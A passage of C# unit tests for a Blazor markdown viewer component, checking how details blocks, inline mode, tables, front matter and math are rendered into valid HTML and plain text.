        var pipeline = new BitMarkdownPipelineBuilder().UseContainers().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, ":::details\nx\n:::");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        // A <details> with no <summary> would be labelled by the browser in a language of its
        // choosing, so one is always written.
        Assert.AreEqual("details", component.Find(".bit-mdv details summary").TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldKeepInlineMarkupValidWhenTheDocumentHoldsABlock()
    {
        var paragraphsOnly = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "one\n\ntwo");
            parameters.Add(p => p.Inline, true);
        });

        var withAList = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "one\n\n- a\n- b");
            parameters.Add(p => p.Inline, true);
        });

        // A span may not legally hold a list, so a document that holds one keeps its div and is
        // laid out inline by the stylesheet instead.
        Assert.AreEqual("SPAN", paragraphsOnly.Find(".bit-mdv").TagName);
        Assert.AreEqual("DIV", withAList.Find(".bit-mdv").TagName);
        Assert.Contains("bit-mdv-inline", withAList.Find(".bit-mdv").ClassName);
    }

    [TestMethod]
    public void BitMarkdownAstHelperShouldSeparateTableCellsInPlainText()
    {
        var document = BitMarkdownPipelines.GitHub.Parse("| a | b |\n|---|---|\n| 1 | 2 |");

        // A table's cells are separate collections on one node; running them together would read
        // as one word.
        Assert.AreEqual("a b 1 2", BitMarkdownAstHelper.ToPlainText(document));
    }

    [TestMethod]
    public void BitMarkdownAstHelperShouldLeaveFrontMatterOutOfPlainText()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseFrontMatter().Build();

        var document = pipeline.Parse("---\ntitle: t\n---\n\nbody");

        // The block describes the file rather than saying anything in it.
        Assert.AreEqual("body", BitMarkdownAstHelper.ToPlainText(document));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldKeepDisplayMathInsideAParagraphAsASpan()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseMathematics().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "before $$a+b$$ after");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        var math = component.Find(".bit-mdv p .math");

        // A <div> inside a <p> is markup no browser keeps as written, and the DOM it rearranges it
        // into is not the one Blazor thinks it rendered - so only a standalone run gets one.
        Assert.AreEqual("SPAN", math.TagName);
        Assert.Contains("math-display", math.ClassName);
        Assert.AreEqual("$$a+b$$", math.TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderAStandaloneMathBlockAsADiv()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseMathematics().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "$$\na+b\n$$");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        var root = component.Find(".bit-mdv");

        Assert.AreEqual("DIV", root.QuerySelector(".math")!.TagName);
        Assert.IsNull(root.QuerySelector("p .math"));
    }
}
